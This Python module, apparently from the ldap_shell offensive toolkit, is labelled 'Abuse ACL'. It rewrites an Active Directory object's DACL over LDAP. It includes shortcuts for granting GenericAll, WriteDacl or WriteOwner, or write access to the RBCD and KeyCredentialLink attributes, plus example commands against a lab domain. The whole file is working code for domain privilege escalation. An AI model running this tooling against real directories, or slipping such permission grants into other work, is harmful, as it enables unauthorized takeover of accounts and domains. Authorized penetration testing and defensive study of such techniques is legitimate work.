import logging
from ldap3 import Connection, MODIFY_REPLACE, MODIFY_ADD, MODIFY_DELETE
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field
from ldap_shell.ldap_modules.base_module import BaseLdapModule, ArgumentType
import ldap3
from ldap_shell.utils.ldap_utils import LdapUtils
from ldap_shell.utils.ace_utils import AceUtils
from ldap_shell.utils.ldaptypes import SR_SECURITY_DESCRIPTOR
import re

class LdapShellModule(BaseLdapModule):
    """Module for modifying DACL entries"""
    
    help_text = "Modify DACL entries for target object"
    examples_text = """
    You need to have elevated rights on the object to edit its ACEs.
    For adding or removing new ACEs, use an account with domain admin rights or GenericAll.
    Examples:
    Add GenericAll rights for user john on user admin:
    `dacl_modify "CN=john,CN=Users,DC=roasting,DC=lab" admin add 0xF01FF`
    ```
    [INFO] DACL modified successfully!
    ```
    Remove priviosly added GenericAll rights for user john on user admin:
    `dacl_modify "CN=john,CN=Users,DC=roasting,DC=lab" admin del GenericAll`
    ```
    [INFO] DACL modified successfully!
    ```
    Remove WriteDacl rights for admins group on admin user:
    `dacl_modify "CN=admins,CN=Users,DC=roasting,DC=lab" admin del WriteDacl`
    ```
    [INFO] DACL modified successfully!
    ```
    Add write permission for msDS-AllowedToActOnBehalfOfOtherIdentity property:
    `dacl_modify "CN=web_svc,CN=Computers,DC=roasting,DC=lab" admin add WritetoRBCD`
    ```
    [INFO] DACL modified successfully!
    ```
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        target: str = Field(
            description="Target object (DN or sAMAccountName)",
            arg_type=ArgumentType.DN
        )
        grantee: str = Field(
            description="Account to modify permissions for",
            arg_type=[ArgumentType.USER, ArgumentType.COMPUTER, ArgumentType.GROUP]
        )
        action: str = Field(
            description="Action: add/del",
            arg_type=ArgumentType.ADD_DEL
        )
        mask: str = Field(
            description="Permission type (genericall, writedacl etc.) or object GUID",
            arg_type=ArgumentType.MASK
        )

    def __init__(self, args_dict: dict, 
                 domain_dumper: domainDumper, 
                 client: Connection,
                 log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')
        self.mask_mapping = {
            "genericall": 0xF01FF,                      #GENERIC_ALL(0x10000000)
            "allextendedrights": 0x20134,               #ADS_RIGHT_DS_CONTROL_ACCESS
            "genericwrite": 0x20034,                    #GENERIC_WRITE and RESET_PASSWORD
            "writeowner": 0xA0034,                      #WRITE_OWNER
            "writedacl": 0x60034,                       #WRITE_DACL
            "writeproperty": 0x20034,                   #ADS_RIGHT_DS_WRITE_PROP
            "delete": 0x30034                           #DELETE
        }
        self.objects = {
            'writetorbcd':'3F78C3E5-F79A-46BD-A0B8-9D18116DDC79',       #ms-DS-AllowedToActOnBehalfOfOtherIdentity
            'writetokeycredlink':'5B47D60F-6090-40B2-9F37-2A4DE88F3063' #ms-Ds-KeyCredentialLink
        }

    def __call__(self):
        # Get target DN
        if not LdapUtils.check_dn(self.client, self.domain_dumper, self.args.target):
            self.log.error(f'Invalid DN: {self.args.target}')
            return
        else:
            target_dn = self.args.target

        # Get grantee information
        grantee_sid = LdapUtils.get_sid(self.client, self.domain_dumper, self.args.grantee)
        if not grantee_sid:
            self.log.error(f'Grantee not found: {self.args.grantee}')
            return

        # Get current security descriptor
        try:
            sd_data, _ = LdapUtils.get_info_by_dn(self.client, self.domain_dumper, target_dn)
            sd = SR_SECURITY_DESCRIPTOR(data=sd_data[0]) if sd_data else AceUtils.create_empty_sd()
        except Exception as e:
            self.log.error(f'Error getting security descriptor: {str(e)}')
            return

        # Define ACE parameters
        if re.match(r'^0x[0-9a-fA-F]+$', self.args.mask):
            mask_value = int(self.args.mask, 16)
            object_type = None
        elif re.fullmatch(r"([\dA-Fa-f]{8})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})([\dA-Fa-f]{8})", self.args.mask):
            mask_value = 32
            object_type = self.args.mask
        elif self.args.mask.lower() in self.mask_mapping:
            mask_value = self.mask_mapping[self.args.mask.lower()]
            object_type = None
        elif self.args.mask.lower() in self.objects:
            mask_value = 32
            object_type = self.objects[self.args.mask.lower()]
        else:
            self.log.error('Invalid mask or object type')
            return

        # Create/delete ACE
        if self.args.action.lower() == 'add':
            ace = AceUtils.createACE(
                sid=grantee_sid, 
                access_mask=mask_value,
                object_type=object_type
            )
            sd['Dacl'].aces.append(ace)
        elif self.args.action.lower() == 'del':
            sd['Dacl'].aces = [
                ace for ace in sd['Dacl'].aces
                if not self._ace_matches(ace, grantee_sid, mask_value, object_type)
            ]
        else:
            self.log.error('Invalid action, use add/del')
            return

        # Apply changes
        try:
            res = self.client.modify(
                target_dn,
                {'nTSecurityDescriptor': [(MODIFY_REPLACE, [sd.getData()])]},
                controls=ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
            )
        except Exception as e:
            self.log.info(f'{target_dn} {self.args.grantee} {self.args.action} {self.args.mask}')
            self.log.error(f'Modification failed: {str(e)}')
            return

        if res:
            self.log.info('DACL modified successfully!')
            if self.client.authentication == 'ANONYMOUS':
                self.log.info('For changes to take effect, please restart ldap_shell')
        else:
            self.log.error('Failed to modify DACL: %s', self.client.result['description'])

    def _ace_matches(self, ace, sid, mask, object_type):
        """Check if ACE matches given parameters"""
        if ace['Ace']['Sid'].formatCanonical() != sid:
            return False
            
        if mask is not None and ace['Ace']['Mask'].hasPriv(mask):
            return True
            
        if object_type is not None:
            try:
                return ace['Ace']['ObjectType'] == LdapUtils.string_to_bin(object_type)
            except AttributeError:
                return False
        return False
